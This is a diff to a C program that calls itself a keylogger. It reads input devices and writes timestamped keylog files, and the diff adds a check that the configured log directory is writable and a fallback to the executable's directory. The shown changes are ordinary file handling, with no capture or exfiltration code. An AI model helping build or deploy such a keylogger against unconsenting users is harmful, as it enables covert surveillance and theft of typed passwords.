@@ -10,6 +10,8 @@
 #include <sys/stat.h>
 #include <time.h>
 #include <locale.h>
+#include <pwd.h>
+#include <grp.h>
 
 #ifndef BITS_PER_LONG
 #define BITS_PER_LONG (sizeof(long) * 8)
@@ -22,6 +24,34 @@
 // Configuration variables
 char config_log_directory[256] = {0};
 int config_dynamic_formatting = 0;  // Disable dynamic formatting
+
+// Function to ensure directory exists and is writable
+int ensure_directory_writable(const char *dir_path) {
+    struct stat st = {0};
+    
+    // Check if directory exists
+    if (stat(dir_path, &st) == -1) {
+        // Directory doesn't exist, try to create it
+        if (mkdir(dir_path, 0755) == -1) {
+            // Failed to create directory
+            return 0;
+        }
+    } else {
+        // Directory exists, check if it's actually a directory
+        if (!S_ISDIR(st.st_mode)) {
+            // Path exists but is not a directory
+            return 0;
+        }
+    }
+    
+    // Check if we have write permission to the directory
+    if (access(dir_path, W_OK) == -1) {
+        // No write permission
+        return 0;
+    }
+    
+    return 1; // Directory exists and is writable
+}
 
 // Helper function to test bits in ioctl results
 static inline int test_bit(int bit, unsigned long *array) {
@@ -218,7 +248,6 @@ int main() {
     // Read configuration file
     read_config("keylogger.conf");
 
-
     // Find input devices
     int fd;
     char device_path[256];
@@ -240,8 +269,36 @@ int main() {
 
     // Use configured log directory if specified, otherwise use executable directory
     if (config_log_directory[0] != '\0') {
-        // Use custom log directory from config
-        snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", config_log_directory, timestamp_str);
+        // Validate and ensure the custom log directory is writable
+        if (!ensure_directory_writable(config_log_directory)) {
+            // If the directory is not writable, fall back to executable directory
+            fprintf(stderr, "Warning: Cannot write to configured log directory '%s'. Using executable directory.\n", config_log_directory);
+            
+            // Use same directory as executable
+            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
+            if (len != -1) {
+                exe_path[len] = '\0';
+                // Extract directory path
+                char *last_slash = strrchr(exe_path, '/');
+                if (last_slash) {
+                    *(last_slash+1) = '\0';
+                    // Ensure we don't exceed buffer size
+                    size_t exe_len = strlen(exe_path);
+                    if (exe_len < sizeof(log_filename) - 32) { // 32 for "keylog_" + timestamp + ".txt" + null terminator
+                        snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", exe_path, timestamp_str);
+                    } else {
+                        snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str); // fallback to current directory
+                    }
+                } else {
+                    snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
+                }
+            } else {
+                snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
+            }
+        } else {
+            // Use custom log directory from config
+            snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", config_log_directory, timestamp_str);
+        }
     } else {
         // Use same directory as executable
         ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
